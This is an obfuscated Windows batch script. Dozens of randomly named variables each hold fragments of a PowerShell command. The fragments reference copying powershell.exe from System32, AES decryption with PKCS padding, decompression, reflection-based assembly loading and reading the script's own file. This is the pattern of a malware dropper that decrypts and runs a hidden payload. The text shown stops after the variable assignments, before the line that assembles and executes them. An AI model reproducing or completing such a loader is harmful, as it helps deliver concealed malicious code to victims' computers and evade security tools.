@echo off
set "VzUQQVfNBV=st"
set "LCoqiMHwXe=he"
set "JjpAYefitz=rS"
set "RhOiwuGzAc=0\"
set "RZVIWjedNn=Wi"
set "miBewBqmVE=32"
set "GcYOwmnOMj=co"
set "sANukYOoRU=nd"
set "gCSMoeZPuh= /"
set "dHoJWCUsUE= C"
set "FwAbmkhBLj=he"
set "jsiGbOYPQh=we"
set "wQJspyGlnn=.e"
set "UGEYgzagUg=em"
set "rxJhyUFkPr=py"
set "JoDPaVhKUz=ll"
set "CxSUxNYPup=do"
set "NxPcHBWoDv=rs"
set "gTzGzdMFNM=s\"
set "crimIKNMKi=:\"
set "xBvPSHYJQD=\W"
set "WvoUPUZAlV=po"
set "rVUhgapxzO=ow"
set "YKWPkGeSxo=xe"
set "yQFHmCDNbJ=Sy"
set "SIyZIzZihI=ll"
set "iVqNZSiJVR=1."
set "JLxaQrbPsf=\v"
set "CNhVZUSVbK=y "
set "XYeRSRmGAN=in"
set "FTSWyslPfz=ws"
set "pJLicZJArf=we"
set "ArpqjndJmE=Po"
set "QxsoioHKtS= %~dp0"
set "pXKQAPqXQi=cd"
set "VhSBsNJcVa= if "
set "NEFQgmfyHy=lrjw"
set "CYdWBcvcQN=yste"
set "KPkWvQfBWG=-4] "
set "RqIBksCPWR=;$HN"
set "cgZcpzvveo=v = "
set "gamXoqqSks=ose("
set "JsPTJOzDMm=.Key"
set "UlJEHSWnzh= [Sy"
set "bmcFhhAYxh=)($r"
set "ihaGHCHXLx=bjec"
set "ocwzEgXzlZ=tS46"
set "hwDTjoxTnB=v = "
set "ZWgSpXftdA=oin "
set "iHXtCejvbk=RRoX"
set "NxjEJhGHzi=ke($"
set "wsdUHZoQer=bstr"
set "QQNtZfSgCi=.Dis"
set "vFIPtknxUc=($lr"
set "GvkYlMdVIk=oint"
set "IBFdOXvsFr=]::C"
set "rSweRecCZx=-joi"
set "psoYmfEEkg=n ''"
set "zQNgAFZyxs== $R"
set "HsXtFLwwsw=vert"
set "HulLVIrxgw=llh "
set "yCwXFmqJtL=();$"
set "VjshnOrUYK=pres"
set "GQJiSPdsCX=join"
set "CZxSqjRTBJ=and "
set "EyiZhdKHRG=jv);"
set "alXvKVWvBR=NTTz"
set "jmQjqcZDOr=rans"
set "rKHiVCbffO=gsjv"
set "qgwxBIdMiT=urit"
set "rPDVolLHkL=Stre"
set "ZSBrKbtYAx=gsYZ"
set "NULEamNlGU=]::N"
set "cbTzQUAYIm=se()"
set "DLQFeMcRmZ===')"
set "AVdXlmvoDo=[Sys"
set "preBJqOgLP=.Len"
set "TujyKCQsQO=('da"
set "QxMAxXyLdp=flec"
set "OwvSOGHEHJ=form"
set "jyGsvMGqvY=$Ggs"
set "pwaNtzBjxm=Comp"
set "UKLRsGvaFh=grap"
set "wkQDXRKtaz=; };"
set "kqFHwKzzoR=Obje"
set "oijkgxIuBZ=tem."
set "WfaapxhYKW=$Ggs"
set "PfBGWsMwBN=rity"
set "ipqpFqcxuF=..-1"
set "GCqSwZULdx=;$XK"
set "bwNQQIzSQj=ypto"
set "FZbTfwmWzO=$WiV"
set "GulqdeXtco='')("
set "joQtAujllI=V = "
set "jDmMzuBexH=ment"
set "HnceAaNEKq=Conv"
set "ozBGaZQgxB=('%~f0'"
set "tSZWVOOdEI=y.Ci"
set "ilVZZUPOWX=nage"
set "TuRzfswASq=Invo"
set "vRbDpmPEqQ=6esa"
set "XXXunMGNYT=.Mem"
set "qbUFsPHjLi=ionM"
set "VesxcbZggg=).Sp"
set "nCGnJXwDHx=ne);"
set "sDNRUuQGoI=th('"
set "EFrBtWtits=gjYA"
set "vZZFyYqiBs=();$"
set "CXbhKXSqsy=.Cry"
set "NUcvumEZEQ=ach "
set "ZLDwOrazpb=;$NT"
set "WInIQltxBK=d;$R"
set "LadXUVtgCh=ect "
set "KWAViEoEyo=tryP"
set "RZJVrCILHj=Disp"
set "cNQxZvBKih=brea"
set "YxuhpQAXOZ=ddin"
set "WGzSpcPOpn=1..-"
set "ciaCQbHhQU=[Sys"
set "PQNZFizBDi=Syst"
set "kMriuiLWDW=yTo("
set "bxHYCOpxaa=.Cop"
set "ZQEnOmpfsz=DcC."
set "rpNUSuUbCn=rt]:"
set "koZGiemCzE=embl"
set "HVPHvKdlfx=pfXE"
set "XsHHYlEsgA=PKCS"
set "EivKmwrmxd=OHRo"
set "UuUpuOaZAv=Obje"
